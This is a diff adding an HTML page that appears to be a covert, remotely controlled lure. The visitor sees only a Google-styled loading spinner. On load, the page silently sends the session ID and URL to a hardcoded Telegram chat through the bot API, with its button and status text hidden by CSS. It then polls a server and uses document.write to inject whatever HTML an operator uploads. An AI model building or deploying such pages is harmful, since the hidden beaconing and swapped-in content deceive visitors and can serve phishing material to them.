@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f4f9;
+            font-family: 'Google Sans', Arial, sans-serif;
+        }
+        .container { background: transparent; padding: 0; }
+        .loader { text-align: center; }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto;
+            border: 4px solid #e8eaed;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .loading-text {
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        .hidden, .session-info, .telegram-btn, .status-message {
+            display: none !important;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (prefers-reduced-motion: reduce) {
+            .spinner { animation: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loadingContainer">
+        <div class="loader" role="status" aria-live="polite">
+            <div class="spinner" id="loadingSpinner" aria-hidden="true"></div>
+            <div class="loading-text">Loading...</div>
+        </div>
+        <div class="session-info hidden">
+            <div class="session-label">Your Session ID</div>
+            <div class="session-id" id="sessionDisplay">Loading...</div>
+        </div>
+        <button class="telegram-btn hidden" id="telegramButton" type="button">
+            Send Session ID to Telegram
+        </button>
+        <div class="status-message hidden" id="statusMessage"></div>
+        <noscript>JavaScript must be enabled to load this preview.</noscript>
+    </div>
+
+    <script>
+    (() => {
+        'use strict';
+
+        // Insert your bot token before using this page.
+        const TELEGRAM_BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = '8391692120';
+
+        const POLL_DELAY_MS = 2000;
+        const REQUEST_TIMEOUT_MS = 30000;
+        const UPDATE_PARAMETER = '__preview_update';
+        const loadingText = document.querySelector('.loading-text');
+        const sessionDisplay = document.getElementById('sessionDisplay');
+        const telegramButton = document.getElementById('telegramButton');
+        const statusMessage = document.getElementById('statusMessage');
+
+        const pageUrl = new URL(window.location.href);
+        let sessionId = pageUrl.searchParams.get('session');
+        const automaticUpdate = Boolean(sessionId) &&
+            pageUrl.searchParams.get(UPDATE_PARAMETER) === '1';
+        pageUrl.searchParams.delete(UPDATE_PARAMETER);
+
+        if (!sessionId) {
+            sessionId = Math.random().toString(36).substring(2, 10);
+            pageUrl.searchParams.set('session', sessionId);
+        }
+
+        if (pageUrl.href !== window.location.href) {
+            window.history.replaceState(window.history.state, '', pageUrl);
+        }
+
+        const encodedSessionId = encodeURIComponent(sessionId);
+        const previewUrl = new URL('/preview', pageUrl.origin);
+        previewUrl.searchParams.set('session', sessionId);
+        const fullUrl = previewUrl.href;
+        sessionDisplay.textContent = sessionId;
+
+        let lastHtml = null;
+        let pollTimer = null;
+        let checking = false;
+        let navigating = false;
+        let telegramSending = false;
+        let started = false;
+
+        async function request(url, options = {}, readJson = false) {
+            const controller = new AbortController();
+            const timeout = window.setTimeout(
+                () => controller.abort(), REQUEST_TIMEOUT_MS
+            );
+            try {
+                const response = await fetch(url, {
+                    ...options,
+                    cache: 'no-store',
+                    signal: controller.signal
+                });
+                const text = await response.text();
+                if (!response.ok) {
+                    let description = '';
+                    try {
+                        description = JSON.parse(text)?.description || '';
+                    } catch (_) {}
+                    throw new Error(
+                        description || `Request failed: HTTP ${response.status}`
+                    );
+                }
+                return readJson ? JSON.parse(text) : text;
+            } finally {
+                window.clearTimeout(timeout);
+            }
+        }
+
+        function escapeTelegramHtml(value) {
+            return String(value)
+                .replaceAll('&', '&amp;')
+                .replaceAll('<', '&lt;')
+                .replaceAll('>', '&gt;');
+        }
+
+        async function sendSessionToTelegram() {
+            if (telegramSending) return;
+            telegramSending = true;
+            telegramButton.disabled = true;
+            telegramButton.textContent = 'Sending...';
+            statusMessage.textContent = 'Sending session ID to Telegram...';
+
+            try {
+                if (!TELEGRAM_BOT_TOKEN ||
+                    TELEGRAM_BOT_TOKEN === 'PASTE_YOUR_BOT_TOKEN_HERE') {
+                    throw new Error('Set TELEGRAM_BOT_TOKEN in the page first.');
+                }
+
+                const message =
+                    '🎯 New Preview Session Ready!\n\n' +
+                    '📋 Session ID: ' + escapeTelegramHtml(sessionId) + '\n' +
+                    '🔗 Full URL: ' + escapeTelegramHtml(fullUrl) + '\n\n' +
+                    'Share this session ID with the uploader to load your HTML content.';
+
+                const data = await request(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    },
+                    true
+                );
+
+                if (!data || data.ok !== true) {
+                    throw new Error(data?.description || 'Telegram rejected the message.');
+                }
+                statusMessage.textContent = 'Session ID sent to Telegram successfully!';
+                telegramButton.textContent = 'Sent to Telegram';
+            } catch (error) {
+                console.error('Telegram notification failed:', error.message);
+                statusMessage.textContent = 'Failed to send: ' + error.message;
+                telegramButton.textContent = 'Send Session ID to Telegram';
+                telegramButton.disabled = false;
+            } finally {
+                telegramSending = false;
+            }
+        }
+
+        // Preserve manual sending through the hidden button or browser console.
+        window.sendSessionToTelegram = sendSessionToTelegram;
+        telegramButton.addEventListener('click', sendSessionToTelegram);
+
+        function loadNewUpload() {
+            const target = new URL(pageUrl.href);
+            target.searchParams.set(UPDATE_PARAMETER, '1');
+            navigating = true;
+            window.clearTimeout(pollTimer);
+            pollTimer = null;
+            try {
+                // A real navigation gives the next upload fresh JavaScript globals.
+                window.location.replace(target.href);
+            } catch (error) {
+                navigating = false;
+                throw error;
+            }
+        }
+
+        async function checkForContent() {
+            if (checking || navigating) return;
+            checking = true;
+            pollTimer = null;
+            try {
+                const data = await request(
+                    '/api/check/' + encodedSessionId, {}, true
+                );
+                if (!data || data.hasContent !== true) return;
+                if (typeof data.html !== 'string' || !data.html.trim()) {
+                    throw new Error('The server reported content without valid HTML.');
+                }
+
+                // Compare the server's HTML, not the DOM changed by user input.
+                if (data.html === lastHtml) return;
+
+                if (lastHtml !== null) {
+                    // Different HTML arrived: load it automatically in a fresh page.
+                    loadNewUpload();
+                    return;
+                }
+
+                // Write only once in each top-level JavaScript environment.
+                lastHtml = data.html;
+                document.open();
+                document.write(data.html);
+                document.close();
+            } catch (error) {
+                console.warn('Preview check failed:', error.message);
+                if (loadingText.isConnected) {
+                    loadingText.textContent = 'Reconnecting...';
+                }
+            } finally {
+                checking = false;
+                if (!navigating) {
+                    pollTimer = window.setTimeout(checkForContent, POLL_DELAY_MS);
+                }
+            }
+        }
+
+        async function start() {
+            if (started) return;
+            started = true;
+            if (!automaticUpdate) {
+                // Original behavior: automatically send the session on page load.
+                void sendSessionToTelegram();
+                try {
+                    await request(
+                        '/api/session/' + encodedSessionId + '/waiting',
+                        { method: 'POST' }
+                    );
+                } catch (error) {
+                    console.warn('Could not register the waiting session:', error.message);
+                }
+            }
+            // An automatic update keeps the session and skips duplicate notification.
+            await checkForContent();
+        }
+
+        if (document.readyState === 'complete') {
+            void start();
+        } else {
+            window.addEventListener('load', start, { once: true });
+        }
+    })();
+    </script>
+</body>
+</html>
